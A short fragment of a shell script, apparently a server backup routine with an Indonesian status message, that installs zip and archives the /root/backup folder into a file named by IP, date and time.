BACKUP_NAME="$MYIP-$DATE-$TIME.zip"

echo "🗜️ Membuat file backup.zip..."
copy_backup > /dev/null 2>&1
cd /root
apt install zip -y > /dev/null 2>&1
zip -r $BACKUP_NAME backup/ > /dev/null 2>&1

